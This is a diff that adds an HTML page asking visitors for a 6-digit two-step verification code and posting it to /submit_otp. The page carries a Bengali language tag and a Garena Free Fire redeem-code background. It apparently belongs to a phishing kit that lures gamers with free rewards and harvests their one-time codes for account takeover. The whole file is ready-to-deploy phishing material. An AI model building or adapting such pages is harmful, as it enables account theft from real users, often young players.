@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OTP Verification</title>
+    <style>
+        body { margin: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #000; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; background-image: url('https://img.gurugamer.com/resize/1200x-/2021/01/21/garena-free-fire-redeem-code-7a60.jpg'); background-size: cover; background-position: center; }
+        .main-container { width: 100%; max-width: 420px; text-align: center; background-color: rgba(15, 15, 15, 0.85); padding: 35px; border-radius: 12px; box-shadow: 0 0 20px rgba(0, 0, 0, 0.5); backdrop-filter: blur(8px); margin: 20px; }
+        .main-title { font-size: 24px; font-weight: 700; color: #FFC107; margin-bottom: 15px; }
+        .main-description { font-size: 16px; margin-bottom: 25px; color: #eee; line-height: 1.5; }
+        input[type="number"] { width: 100%; padding: 14px; margin: 20px 0; display: inline-block; border: 1px solid #555; border-radius: 6px; box-sizing: border-box; font-size: 20px; text-align: center; background-color: #333; color: white; letter-spacing: 5px; }
+        button { width: 100%; padding: 14px 20px; margin: 10px 0; border: none; border-radius: 6px; cursor: pointer; font-size: 18px; font-weight: bold; color: white; background-color: #e67e22; transition: background-color 0.3s; }
+        button:hover { background-color: #d35400; }
+    </style>
+</head>
+<body>
+    <div class="main-container">
+        <h2 class="main-title">Two-Step Verification</h2>
+        <p class="main-description">For your security, please enter the 6-digit code we sent to your device.</p>
+        <form action="/submit_otp" method="post">
+            <input type="number" name="otp" placeholder="_ _ _ _ _ _" maxlength="6" pattern="\d{6}" title="Please enter a 6-digit number" required oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);">
+            <button type="submit">Verify</button>
+        </form>
+    </div>
+</body>
+</html>
